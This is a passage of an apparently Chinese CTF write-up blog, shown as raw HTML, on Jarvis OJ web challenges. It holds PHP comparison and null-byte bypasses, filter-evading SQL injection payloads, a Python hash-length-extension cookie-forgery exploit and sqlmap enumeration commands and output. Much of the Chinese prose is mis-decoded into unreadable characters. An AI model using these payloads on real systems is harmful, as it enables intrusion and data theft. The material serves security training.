class="hljs-number">4</span>)<br>    &#123;<br>        <span class="hljs-keyword">require</span>(<span class="hljs-string">&quot;flag.txt&quot;</span>);<br>    &#125;<br>    <span class="hljs-keyword">else</span><br>    &#123;<br>        <span class="hljs-keyword">print</span> <span class="hljs-string">&quot;work harder!harder!harder!&quot;</span>;<br>    &#125;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>æ˜“å¾—éœ€è¦ get ä¼ å‚ <code>id</code>, <code>a</code>, <code>b</code> ï¼Œå¹¶ä¸”æ»¡è¶³æºç ä¸­çš„åˆ¤æ–­</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-comment">// å½“ç„¶é¦–å…ˆæ˜¯è¦æœ‰ id å‚æ•°ä¸”ä¸èƒ½ä¸º 0ï¼Œç„¶åçœ‹åˆ°ç¬¬ä¸€ä¸ª if å‡½æ•°</span><br><span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">stripos</span>(<span class="hljs-variable">$a</span>,<span class="hljs-string">&#x27;.&#x27;</span>))&#123;<br><span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;Hahahahahaha&#x27;</span>;<br><span class="hljs-keyword">return</span> ;<br>&#125;<br><span class="hljs-comment">// è¿™é‡Œå¯¹ $a è¿›è¡Œäº†åˆ¤æ–­ï¼Œå‚æ•° a é‡Œé¢ä¸å…è®¸å«æœ‰ &#x27;.&#x27;</span><br><br><span class="hljs-variable">$data</span> = @<span class="hljs-title function_ invoke__">file_get_contents</span>(<span class="hljs-variable">$a</span>,<span class="hljs-string">&#x27;r&#x27;</span>);<br><span class="hljs-comment">// æ¥ä¸‹æ¥è¿™ä¸ªå‡½æ•°ï¼Œfile_get_contents() çš„ä½œç”¨æ˜¯æŠŠæ•´ä¸ªæ–‡ä»¶è¯»å…¥ä¸€ä¸ªå­—ç¬¦ä¸²ä¸­</span><br><span class="hljs-comment">// åœ¨ ctf ä¸­ä¸€èˆ¬ç»“åˆ php ä¼ªåè®®è¿ç”¨</span><br><span class="hljs-comment">// å› æ­¤ $data = php://input ,ç„¶ååœ¨ post data é‡Œé¢åŠ å…¥ &quot;1112 is a nice lab!&quot;</span><br><br><span class="hljs-variable">$id</span> == <span class="hljs-number">0</span><br><span class="hljs-comment">// å› ä¸ºå¼€å¤´çš„åˆ¤æ–­ä½¿å¾— id ä¸èƒ½ä¸º 0ï¼Œä½†è¿™é‡Œè¦éªŒè¯ id çš„å€¼è¦ç­‰äº 0ï¼Œè¿™é‡Œæ˜¯ php ä¸¤ä¸ªç­‰äºå·</span><br><span class="hljs-comment">// php ä¸­ == åªæ˜¯æ¯”è¾ƒä¸¤ä¸ªæ•°çš„å€¼æ˜¯å¦ç›¸ç­‰ï¼Œ0a == 0 ä¼šæŠŠ0aè§£ææˆ0æ¥ç»•è¿‡éªŒè¯ï¼ˆ0ååŠ ä»»æ„å­—ç¬¦ä¸²ï¼Œæ­¤æ—¶idä¼šè¢«è¯†åˆ«ä¸ºå­—ç¬¦ä¸²ï¼Œå½“åšæ¯”å¯¹çš„æ—¶å€™å–å‰é¢æ•°å­—éƒ¨åˆ†ï¼Œä¹Ÿå°±æ˜¯0ï¼‰</span><br>    <br><span class="hljs-title function_ invoke__">strlen</span>(<span class="hljs-variable">$b</span>)&gt;<span class="hljs-number">5</span> <span class="hljs-keyword">and</span> <span class="hljs-title function_ invoke__">eregi</span>(<span class="hljs-string">&quot;111&quot;</span>.<span class="hljs-title function_ invoke__">substr</span>(<span class="hljs-variable">$b</span>,<span class="hljs-number">0</span>,<span class="hljs-number">1</span>),<span class="hljs-string">&quot;1114&quot;</span>) <span class="hljs-keyword">and</span> <span class="hljs-title function_ invoke__">substr</span>(<span class="hljs-variable">$b</span>,<span class="hljs-number">0</span>,<span class="hljs-number">1</span>)!=<span class="hljs-number">4</span>;<br><span class="hljs-comment">// bå‚æ•°çš„é•¿åº¦è¦å¤§äº5,å¹¶ä¸”åœ¨ç¬¬äºŒä¸ªå‚æ•°é‡Œæœç´¢ï¼Œ&quot;111&quot;åŠ ä¸Šbçš„ç¬¬ä¸€ä¸ªå­—ç¬¦ï¼ˆç¬¬ä¸€ä¸ªå‚æ•°ï¼‰ï¼Œä¹Ÿå°±æ˜¯ç¬¬äºŒä¸ªå‚æ•°åŒ…å«ç¬¬ä¸€ä¸ªå‚æ•°å°±å¯ä»¥ï¼Œè¿™é‡Œæˆ‘ä»¬ç”¨åˆ°%00è¿›è¡Œæˆªæ–­ï¼Œå› æ­¤&quot;111%00&quot;ä¼šè¢«è§£ææˆ&quot;111&quot;ï¼Œå­—ç¬¦ä¸²ç»“æŸï¼ŒåŒæ—¶ç¬¬ä¸€ä¸ªå­—ç¬¦ä¸èƒ½æ˜¯4,æ‰€ä»¥æˆ‘ä»¬è¿™é‡Œèµ‹å€¼$b=%00111111</span><br></code></pre></td></tr></table></figure><p><img src="https://s2.ax1x.com/2020/02/07/1gv4UA.jpg" alt="1gv4UA.jpg"></p><p>çœ‹èµ·æ¥åƒä¸€ä¸ªurlï¼Œæˆ‘ä»¬è®¿é—®å¾—åˆ°æ–°é¡µé¢ï¼š</p><p><img src="https://s2.ax1x.com/2020/02/07/1gvoCt.jpg" alt="1gvoCt.jpg"></p><p>å¯ä»¥çœ‹åˆ°ï¼Œurlä¸Šè‡ªåŠ¨åŠ ä¸Šäº†idå‚æ•°ï¼ŒçŒœæµ‹æ˜¯sqlæ³¨å…¥</p><p>ç» fuzzï¼Œå‘ç°ç©ºæ ¼è¢«è¿‡æ»¤ï¼Œä½¿ç”¨ <code>/*1*/</code>å¯ä»¥ç»•è¿‡ï¼Œå…³é”®å­—å¯ä»¥é‡‡ç”¨åŒå†™ç»•è¿‡</p><p>å€¼å¾—æ³¨æ„çš„æ˜¯ï¼Œè¿™é‡Œæ˜¯intå‹æ³¨å…¥ï¼Œä¸éœ€è¦æ·»åŠ å•å¼•å·</p><p>æµ‹è¯•æ³¨å…¥ç‚¹ï¼š</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs sql">?id<span class="hljs-operator">=</span><span class="hljs-number">1</span><span class="hljs-comment">/*1*/</span><span class="hljs-keyword">and</span><span class="hljs-comment">/*1*/</span><span class="hljs-number">1</span><span class="hljs-operator">=</span><span class="hljs-number">1</span># # å›æ˜¾æ­£å¸¸<br>?id<span class="hljs-operator">=</span><span class="hljs-number">1</span><span class="hljs-comment">/*1*/</span><span class="hljs-keyword">and</span><span class="hljs-comment">/*1*/</span><span class="hljs-number">1</span><span class="hljs-operator">=</span><span class="hljs-number">2</span># # å›æ˜¾é”™è¯¯<br></code></pre></td></tr></table></figure><p>ç”¨order byç­‰è¿›è¡Œå­—æ®µæ•°æŸ¥è¯¢ï¼Œè¿™é‡Œæˆ‘ç›´æ¥çŒœæµ‹3ï¼Œå¸¦æœ‰è¿æ°”æˆåˆ†</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql">?id<span class="hljs-operator">=</span><span class="hljs-number">-1</span><span class="hljs-comment">/*1*/</span>uniounionn<span class="hljs-comment">/*1*/</span>seselectlect<span class="hljs-comment">/*1*/</span><span class="hljs-number">1</span>,<span class="hljs-number">2</span>,<span class="hljs-number">3</span>#<br></code></pre></td></tr></table></figure><p>é¡µé¢å›æ˜¾3ï¼Œå› æ­¤æˆ‘ä»¬åˆ©ç”¨3è¿™ä¸ªåˆ—æ¥è¿›è¡ŒæŸ¥è¯¢</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql">?id<span class="hljs-operator">=</span><span class="hljs-number">-1</span><span class="hljs-comment">/*1*/</span>uniounionn<span class="hljs-comment">/*1*/</span>seselectlect<span class="hljs-comment">/*1*/</span><span class="hljs-number">1</span>,<span class="hljs-number">2</span>,group_concat(table_name)<span class="hljs-comment">/*1*/</span>frfromom<span class="hljs-comment">/*1*/</span>information_schema.tables<span class="hljs-comment">/*1*/</span><span class="hljs-keyword">where</span><span class="hljs-comment">/*1*/</span>table_schema<span class="hljs-operator">=</span>database()#<br></code></pre></td></tr></table></figure><p>é¡µé¢è¿”å›<code>content</code>ï¼Œåªæœ‰ä¸€ä¸ªè¡¨ï¼Œç»§ç»­æŸ¥è¯¢åˆ—å</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql">?id<span class="hljs-operator">=</span><span class="hljs-number">-1</span><span class="hljs-comment">/*1*/</span>uniounionn<span class="hljs-comment">/*1*/</span>seselectlect<span class="hljs-comment">/*1*/</span><span class="hljs-number">1</span>,<span class="hljs-number">2</span>,group_concat(column_name)<span class="hljs-comment">/*1*/</span>frfromom<span class="hljs-comment">/*1*/</span>information_schema.columns<span class="hljs-comment">/*1*/</span><span class="hljs-keyword">where</span><span class="hljs-comment">/*1*/</span>table_name<span class="hljs-operator">=</span><span class="hljs-number">0x636f6e74656e74</span>#<br></code></pre></td></tr></table></figure><p>è¿™é‡Œå› ä¸ºå¯¹è¡¨å<code>content</code>è¿›è¡Œäº†è¿‡æ»¤ï¼Œæ‰€ä»¥æˆ‘ä»¬æ¢æˆåå…­è¿›åˆ¶å³å¯ç»•è¿‡</p><p>ç½‘é¡µå›æ˜¾ <code>id</code>ï¼Œ<code>context</code>ï¼Œ<code>title</code>ä¸‰ä¸ªåˆ—åï¼Œflagåœ¨<code>context</code>é‡Œï¼ŒæŸ¥è¯¢å¯å¾—</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql">payload: ?id<span class="hljs-operator">=</span><span class="hljs-number">-1</span><span class="hljs-comment">/*1*/</span>uniounionn<span class="hljs-comment">/*1*/</span>seselectlect<span class="hljs-comment">/*1*/</span><span class="hljs-number">1</span>,<span class="hljs-number">2</span>,context<span class="hljs-comment">/*1*/</span>frfromom<span class="hljs-comment">/*1*/</span>content#<br></code></pre></td></tr></table></figure><h1 id="flag-åœ¨ç®¡ç†å‘˜æ‰‹é‡Œ"><a href="#flag-åœ¨ç®¡ç†å‘˜æ‰‹é‡Œ" class="headerlink" title="flag åœ¨ç®¡ç†å‘˜æ‰‹é‡Œ"></a>flag åœ¨ç®¡ç†å‘˜æ‰‹é‡Œ</h1><p>Descriptionï¼š</p><blockquote><p>åªæœ‰ç®¡ç†å‘˜æ‰èƒ½è·å¾—flagï¼Œä½ èƒ½æƒ³åŠæ³•è·å¾—å—ï¼Ÿ</p><p><code>linkï¼šhttp://web.jarvisoj.com:32778/</code></p></blockquote><p>æ‰“å¼€é¢˜ç›®ç¯å¢ƒï¼Œçœ‹è§ <code>Only Admin can see the flag!!</code></p><p>æŸ¥çœ‹æºä»£ç æ— æœï¼Œåˆ†æä¸€ä¸‹æ•°æ®åŒ…ï¼Œf12&#x2F;bpèµ°èµ·ï¼Œå¯ä»¥æ³¨æ„åˆ°ï¼š</p><p><img src="https://s2.ax1x.com/2020/02/07/1gvT8P.jpg" alt="1gvT8P.jpg"></p><p><code>role=s%3A5%3A%22guest%22%3B</code></p><p><code>hsh=3a4727d57463f122833d9e732f94e4e0</code></p><p>æŠ“åŒ…æŠŠ <code>role</code>æ”¹æˆadminå‘ç°å¹¶æ²¡æœ‰ä»€ä¹ˆç”¨ï¼Œé‚£åº”è¯¥è·Ÿhshï¼ˆçŒœæµ‹æ˜¯hashå€¼ï¼‰æœ‰å…³</p><p>å…ˆç”¨<code>dirsearch</code>æ‰«ä¸€ä¸‹</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">âœ  dirsearch git:(master) python3 dirsearch.py -u http://web.jarvisoj.com:32778 -e *<br></code></pre></td></tr></table></figure><p>å‘ç°æœ‰æºç æ³„æ¼<code>index.php~</code></p><p><img src="https://s2.ax1x.com/2020/02/07/1gv7gf.jpg" alt="1gv7gf.jpg"></p><p>è®¿é—®<code>index.php~</code>æŠŠæ–‡ä»¶ä¸‹ä¸‹æ¥ï¼Œè¿›è¡Œä»£ç å®¡è®¡ã€‚</p><p>è¿™é‡Œæœ‰ä¸€ç‚¹ï¼Œä¸‹è½½ä¸‹æ¥æ ¼å¼æ˜¯éå¸¸ä¹±çš„ï¼Œå› æ­¤æˆ‘ä»¬è¦å…ˆæŠŠ<code>index.php~</code>æ”¹åä¸º<code>.index.php.bak</code></p><p>ç„¶åæ‰§è¡Œ <code>vim -r index.php</code>è¿›è¡Œæ¢å¤ï¼Œè·å¾—æºç ï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>  <br><span class="hljs-variable">$auth</span> = <span class="hljs-literal">false</span>; <br><span class="hljs-variable">$role</span> = <span class="hljs-string">&quot;guest&quot;</span>; <br><span class="hljs-variable">$salt</span> =  <br><span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_COOKIE</span>[<span class="hljs-string">&quot;role&quot;</span>])) &#123; <br><span class="hljs-variable">$role</span> = <span class="hljs-title function_ invoke__">unserialize</span>(<span class="hljs-variable">$_COOKIE</span>[<span class="hljs-string">&quot;role&quot;</span>]); <br> <span class="hljs-variable">$hsh</span> = <span class="hljs-variable">$_COOKIE</span>[<span class="hljs-string">&quot;hsh&quot;</span>]; <br> <span class="hljs-keyword">if</span> (<span class="hljs-variable">$role</span>===<span class="hljs-string">&quot;admin&quot;</span> &amp;&amp; <span class="hljs-variable">$hsh</span> === <span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-variable">$salt</span>.<span class="hljs-title function_ invoke__">strrev</span>(<span class="hljs-variable">$_COOKIE</span>[<span class="hljs-string">&quot;role&quot;</span>]))) &#123; <br> <span class="hljs-variable">$auth</span> = <span class="hljs-literal">true</span>; <br> &#125; <span class="hljs-keyword">else</span> &#123; <br> <span class="hljs-variable">$auth</span> = <span class="hljs-literal">false</span>; <br> &#125; <br> &#125; <span class="hljs-keyword">else</span> &#123; <br> <span class="hljs-variable">$s</span> = <span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-variable">$role</span>); <br> <span class="hljs-title function_ invoke__">setcookie</span>(<span class="hljs-string">&#x27;role&#x27;</span>,<span class="hljs-variable">$s</span>); <br> <span class="hljs-variable">$hsh</span> = <span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-variable">$salt</span>.<span class="hljs-title function_ invoke__">strrev</span>(<span class="hljs-variable">$s</span>)); <br> <span class="hljs-title function_ invoke__">setcookie</span>(<span class="hljs-string">&#x27;hsh&#x27;</span>,<span class="hljs-variable">$hsh</span>); <br> &#125; <br> <span class="hljs-keyword">if</span> (<span class="hljs-variable">$auth</span>) &#123; <br> <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;h3&gt;Welcome Admin. Your flag is  </span><br><span class="hljs-string"> &#125; else &#123; </span><br><span class="hljs-string"> echo &quot;</span>&lt;h3&gt;Only Admin can see the flag!!&lt;/h3&gt;<span class="hljs-string">&quot;; </span><br><span class="hljs-string"> &#125; </span><br></code></pre></td></tr></table></figure><p>è¿™é‡Œçš„hshæ˜¯åŠ ç›md5ï¼Œä¸éš¾æƒ³åˆ°æ˜¯hashé•¿åº¦æ‰©å±•æ”»å‡»</p><p><strong>äº†è§£å“ˆå¸Œé•¿åº¦æ‰©å±•æ”»å‡»</strong></p><p>å“ˆå¸Œé•¿åº¦æ‰©å±•æ”»å‡»é€‚ç”¨äºåŠ å¯†æƒ…å†µä¸ºï¼š<code>hash($SECRET, $message)</code>çš„æƒ…å†µï¼Œå…¶ä¸­ hash æœ€å¸¸è§çš„å°±æ˜¯ md5ã€hash1ã€‚æˆ‘ä»¬å¯ä»¥åœ¨ä¸çŸ¥é“<code>$SECRET</code>çš„æƒ…å†µä¸‹æ¨ç®—å‡ºå¦å¤–ä¸€ä¸ªåŒ¹é…çš„å€¼ã€‚å¦‚ä¸Šä¾‹æ‰€ç»™çš„ PHP ä»£ç ï¼š</p><ul><li>æˆ‘ä»¬çŸ¥é“<code>md5($SECRET . strrev($_COOKIE[&quot;auth&quot;]))</code>çš„å€¼</li><li>æˆ‘ä»¬çŸ¥é“<code>$hsh</code>çš„å€¼</li><li>æˆ‘ä»¬å¯ä»¥ç®—å‡ºå¦å¤–ä¸€ä¸ª md5 å€¼å’Œå¦å¤–ä¸€ä¸ª $hsh çš„å€¼ï¼Œä½¿å¾— <code>$hsh == md5($SECRET . strrev($_COOKIE[&quot;auth&quot;]))</code></li></ul><p>è¿™æ ·å³å¯é€šè¿‡éªŒè¯ã€‚ </p><figure class="highlight moonscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs moonscript">ç¬¬ä¸€ä¸ªæ¡ä»¶ $role===<span class="hljs-string">&quot;admin&quot;</span><br>åªéœ€è¦ä½¿$roleå‚æ•°çš„å‰<span class="hljs-number">5</span>ä¸ªå­—ç¬¦æ˜¯<span class="hljs-string">&quot;admin&quot;</span>ï¼Œç¬¬å…­ä¸ªå­—ç¬¦æ˜¯<span class="hljs-string">&#x27;\0&#x27;</span>å³å¯ã€‚<br>ç¬¬äºŒä¸ªæ¡ä»¶ $hsh === md5($salt.strrev($_COOKIE[<span class="hljs-string">&quot;role&quot;</span>]))<br>æ³¨æ„å’Œ$saltè¿æ¥çš„å­—ç¬¦ä¸²æ˜¯ç»è¿‡strrevå‡½æ•°å¤„ç†çš„roleå‚æ•°ï¼Œåªéœ€è¦æ„é€ roleå‚æ•°çš„ååŠéƒ¨åˆ†ï¼Œé€šè¿‡hashé•¿åº¦æ‰©å±•æ”»å‡»ï¼Œç»è¿‡è¿ç®—å¾—åˆ°æ–°çš„hshå³å¯ã€‚$saltçš„é•¿åº¦æš‚æ—¶ä¸çŸ¥é“ï¼Œæš‚æ—¶è¾“å…¥ä¸€ä¸ªæ•°å­—<span class="hljs-number">10</span>ï¼Œå¾—åˆ°æ–°çš„hashå€¼fcdc3840332555511c4e4323f6decb07ä»¥åŠä¸€ä¸ªæ¥è¿‘payloadçš„å­—ç¬¦ä¸²;<span class="hljs-string">&quot;tseug&quot;</span>:<span class="hljs-number">5</span>:s\x80\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\xb0\x00\x00\x00\x00\x00\x00\x00;<span class="hljs-string">&quot;nimda&quot;</span>:<span class="hljs-number">5</span>:sã€‚\xb0è¯´æ˜$salt+;<span class="hljs-string">&quot;tseug&quot;</span>:<span class="hljs-number">5</span>:sä¸€å…±<span class="hljs-number">176</span>bitï¼Œä¹Ÿå°±æ˜¯<span class="hljs-number">22</span>å­—èŠ‚ï¼Œ$salté•¿å‡è®¾æ˜¯<span class="hljs-number">10</span>å­—èŠ‚ã€‚<br></code></pre></td></tr></table></figure><figure class="highlight coq"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs coq">hash_extenderï¼š<br>å·²çŸ¥hash&#123;secret(å·²çŸ¥é•¿åº¦)&#125;ï¼Œæ±‚hash&#123;secret (å·²çŸ¥é•¿åº¦)|<span class="hljs-type">| data</span> (å¡«å……å­—æ®µï¼‰|<span class="hljs-type">| attacker_controlled_data</span>ï¼ˆè‡ªå®šä¹‰å­—ç¬¦ä¸²ï¼‰&#125;<br>hashpumpyï¼š<br>hashpump(hexdigest, original_data, data_to_add, key_length) -&gt; (digest, message)<br>æœ¬é¢˜ï¼šå·²çŸ¥md5(secret(æœªçŸ¥é•¿åº¦ï¼‰+string1)ï¼Œæ±‚md5&#123;secret|<span class="hljs-type">|%00</span>ç­‰å¡«å……å­—æ®µ|<span class="hljs-type">|2string</span>&#125;<br>æœ€å¤§çš„ä¸åŒå°±æ˜¯ä¸çŸ¥é“salté•¿åº¦ï¼å¤è¯è¯´çš„å¥½ï¼Œçˆ†ç ´å°±æ˜¯è‰ºæœ¯ï¼Œè¿™é¢˜åº”è¯¥ä¸ä¼šéš¾ä¸ºæˆ‘ä»¬ï¼Œä»<span class="hljs-number">0</span><span class="hljs-number">-15</span>çˆ†ç ´ã€‚<br></code></pre></td></tr></table></figure><p>exp:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#coding=utf-8</span><br><span class="hljs-keyword">import</span> requests,hashpumpy,urllib<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">exploit</span>(): <span class="hljs-comment">#py2</span><br>    url = <span class="hljs-string">&#x27;http://web.jarvisoj.com:32778/&#x27;</span><br>    sha = <span class="hljs-string">&#x27;3a4727d57463f122833d9e732f94e4e0&#x27;</span><br>    string0 = <span class="hljs-string">&#x27;;&quot;tseug&quot;:5:s&#x27;</span><br>    string1 = <span class="hljs-string">&#x27;;&quot;nimda&quot;:5:s&#x27;</span><br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">15</span>):<br>        digest, message = hashpumpy.hashpump(sha,string0,string1,i)<br>        payload =&#123;<span class="hljs-string">&#x27;role&#x27;</span>:urllib.quote(message[::-<span class="hljs-number">1</span>]), <span class="hljs-string">&#x27;hsh&#x27;</span>:digest&#125;<br>        <span class="hljs-built_in">print</span> i,payload<br>        html = requests.get(url,cookies=payload).text<span class="hljs-comment">#æäº¤ç­”æ¡ˆ</span><br>        <span class="hljs-keyword">if</span> <span class="hljs-string">&#x27;Welcome&#x27;</span> <span class="hljs-keyword">in</span> html:<br>            index = html.find(<span class="hljs-string">&#x27;flag&#x27;</span>)<br>            edge = html.find(<span class="hljs-string">&#x27;&lt;/h3&gt;&#x27;</span>)<br>    message = html[index:edge]<br>    <span class="hljs-built_in">print</span>(message)<br>    exit()<br>exploit()<br></code></pre></td></tr></table></figure><p>hash-length-extension-attacks : </p><p><code>https://en.wikipedia.org/wiki/Length_extension_attack</code></p><p><code>https://blog.skullsecurity.org/2012/everything-you-need-to-know-about-hash-length-extension-attacks</code></p><p>pç¥çš„blog : </p><p><code>https://www.cnblogs.com/pcat/p/5478509.html</code></p><p>å¦å¤–ï¼Œåªæœ‰<code>salt</code>åœ¨å‰ï¼Œ<code>value</code>åœ¨åï¼Œæ‰å¯ä½¿ç”¨ Hashé•¿åº¦æ‰©å±•æ”»å‡»ã€‚</p><h1 id="Simple-Injection"><a href="#Simple-Injection" class="headerlink" title="Simple Injection"></a>Simple Injection</h1><p>Descriptionï¼š</p><blockquote><p>å¾ˆç®€å•çš„æ³¨å…¥ï¼Œå¤§å®¶è¯•è¯•ï¼Ÿ</p><p><code>linkï¼šhttp://web.jarvisoj.com:32787/</code></p><p>sourceï¼šISCC2016</p></blockquote><p>æ‰“å¼€æ˜¯ä¸€ä¸ªç™»å½•æ¡†ï¼Œè¾“å…¥ admin è¿›è¡Œ Fuzzï¼Œæ˜¾ç¤ºå¯†ç é”™è¯¯</p><p>æ¥ç€è¾“å…¥ adminâ€™ ï¼Œæç¤ºç”¨æˆ·åé”™è¯¯ã€‚</p><p>ç»å¤šæ¬¡æµ‹è¯•ï¼Œå‘ç°å¯¹ç©ºæ ¼è¿›è¡Œäº†è¿‡æ»¤ï¼Œå¹¶ä¸”å¯ä»¥ç”¨ <code>/**/</code> è¿›è¡Œç»•è¿‡ã€‚</p><p>å¯¹å…³é”®å­—è²Œä¼¼å¹¶æ²¡æœ‰è¿‡æ»¤ï¼Œè‡³å°‘ä¸å½±å“æœ¬æ¬¡åšé¢˜ï¼Œå› æ­¤æˆ‘ä»¬å¯ä»¥ç›´æ¥ç”¨ sqlmap è·‘</p><p>å› ä¸ºæ˜¯ Post ï¼Œæˆ‘ä»¬ç”¨ Burpsuite æŠ“åŒ…åï¼Œå­˜ä¸º txt æ–‡ä»¶ï¼Œç„¶åä½¿ç”¨ -r è¿›è¡Œè¯»å–</p><p>å¹¶ä¸”æˆ‘ä»¬çŸ¥é“ç©ºæ ¼ç”¨ <code>/**/</code> ç»•è¿‡ï¼Œå¹¶ä¸”æ³¨å…¥ç‚¹åœ¨ <code>username</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_"># </span><span class="language-bash">sqlmap -r 1.txt --tamper=space2comment -p username</span> <br></code></pre></td></tr></table></figure><p>è¿™é¢˜æ˜¯ç›²æ³¨ï¼ŒTime-based å’Œ Bool-Based éƒ½å¯ä»¥ï¼Œå–å†³äºå†™è„šæœ¬çš„æ–¹å¼</p><p>å›æ˜¾ï¼š</p><p><img src="https://s2.ax1x.com/2020/02/07/1gvHv8.jpg" alt="1gvHv8.jpg"></p><p>æ¥ä¸‹æ¥è¯»å–æ•°æ®åº“ï¼š</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs powershell"><span class="hljs-comment"># sqlmap -r 1.txt --tamper=space2comment -p username --dbs </span><br><br>[<span class="hljs-number">17</span>:<span class="hljs-number">25</span>:<span class="hljs-number">52</span>] [<span class="hljs-type">INFO</span>] the back<span class="hljs-literal">-end</span> DBMS is MySQL<br>web application technology: PHP <span class="hljs-number">5.6</span>.<span class="hljs-number">21</span>, Apache <span class="hljs-number">2.4</span>.<span class="hljs-number">18</span><br>back<span class="hljs-literal">-end</span> DBMS: MySQL &gt;= <span class="hljs-number">5.0</span>.<span class="hljs-number">12</span><br>[<span class="hljs-number">17</span>:<span class="hljs-number">25</span>:<span class="hljs-number">52</span>] [<span class="hljs-type">INFO</span>] fetching database names<br>[<span class="hljs-number">17</span>:<span class="hljs-number">25</span>:<span class="hljs-number">52</span>] [<span class="hljs-type">INFO</span>] fetching number of databases<br>[<span class="hljs-number">17</span>:<span class="hljs-number">25</span>:<span class="hljs-number">53</span>] [<span class="hljs-type">INFO</span>] resumed: <span class="hljs-number">3</span><br>[<span class="hljs-number">17</span>:<span class="hljs-number">25</span>:<span class="hljs-number">53</span>] [<span class="hljs-type">INFO</span>] resumed: information_schema<br>[<span class="hljs-number">17</span>:<span class="hljs-number">25</span>:<span class="hljs-number">53</span>] [<span class="hljs-type">INFO</span>] resumed: injection<br>[<span class="hljs-number">17</span>:<span class="hljs-number">25</span>:<span class="hljs-number">53</span>] [<span class="hljs-type">INFO</span>] resumed: test<br>available databases [<span class="hljs-number">3</span>]:<br>[*] information_schema<br>[*] injection<br>[*] test<br></code></pre></td></tr></table></figure><p>æˆ‘ä»¬çŒœæµ‹ <code>injection</code> è¡¨ï¼ŒæŸ¥è¯¢ <code>tables</code> </p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_"># </span><span class="language-bash">sqlmap -r 1.txt --tamper=space2comment -p username -D injection --tables</span>      <br><br>web application technology: PHP 5.6.21, Apache 2.4.18<br>back-end DBMS: MySQL &gt;= 5.0.12<br>[17:31:53] [INFO] fetching tables for database: &#x27;injection&#x27;<br>[17:31:53] [INFO] fetching number of tables for database &#x27;injection&#x27;<br>[17:31:53] [INFO] resumed: 1<br>[17:31:53] [INFO] resumed: admin<br>Database: injection<br>[1 table]<br>+-------+<br>| admin |<br>+-------+<br><br></code></pre></td></tr></table></figure><p>æŸ¥è¯¢ <code>columns</code></p><figure class="highlight 